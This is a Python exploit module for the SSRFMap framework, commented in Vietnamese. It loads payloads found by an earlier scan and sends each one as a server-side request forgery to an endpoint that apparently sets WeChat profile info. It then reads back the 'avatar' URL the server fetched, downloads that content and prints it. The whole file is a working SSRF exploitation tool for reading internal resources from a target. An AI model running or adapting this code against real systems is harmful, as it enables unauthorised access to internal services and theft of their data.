from core.utils import *
import logging
import requests
import json
import os

# Metadata module
name          = "dump_content"
description   = "Đọc file valid_targets.txt và tải nội dung chi tiết"
author        = "SSRFMap User"
documentation = []

class exploit():

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched - Dumping content...")

        # Kiểm tra file input
        input_file = "valid_targets.txt"
        if not os.path.exists(input_file):
            print(f"\n[!] Error: File '{input_file}' not found.")
            print("Please run 'mass_scan' module first to generate targets.\n")
            return

        # Đọc danh sách payload
        with open(input_file, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

        if not targets:
            print(f"\n[!] File '{input_file}' is empty. No valid targets found previously.\n")
            return

        # Setup URL
        target_url_base = f"{requester.protocol}://{requester.host}{requester.action}"
        info_api = target_url_base.replace("/setWechatInfo", "/info")

        print(f"\n[+] Found {len(targets)} targets to dump. Starting...\n")

        # Duyệt và dump nội dung
        for payload in targets:
            self.dump_target(requester, args, payload, info_api)

    def dump_target(self, requester, args, payload, info_api):
        try:
            # Gửi payload
            requester.do_request(args.param, payload)
            
            # Lấy link ảnh
            response = requests.get(info_api, headers=requester.headers)
            data = response.json()
            
            if 'data' in data and 'avatar' in data['data']:
                file_url = data['data']['avatar']
                
                if file_url:
                    if file_url.startswith("/"):
                         base_url = f"{requester.protocol}://{requester.host}"
                         file_url = base_url + file_url
                    
                    # Tải nội dung
                    content = requests.get(file_url).text
                    
                    # IN NỘI DUNG RA MÀN HÌNH
                    print("="*60)
                    print(f"TARGET: {payload}")
                    print("-" * 60)
                    print(content)
                    print("="*60 + "\n")
                else:
                    print(f"[!] Failed to retrieve URL for: {payload}")
            else:
                 print(f"[!] Invalid API response for: {payload}")

        except Exception as e:
            print(f"[!] Error dumping {payload}: {e}")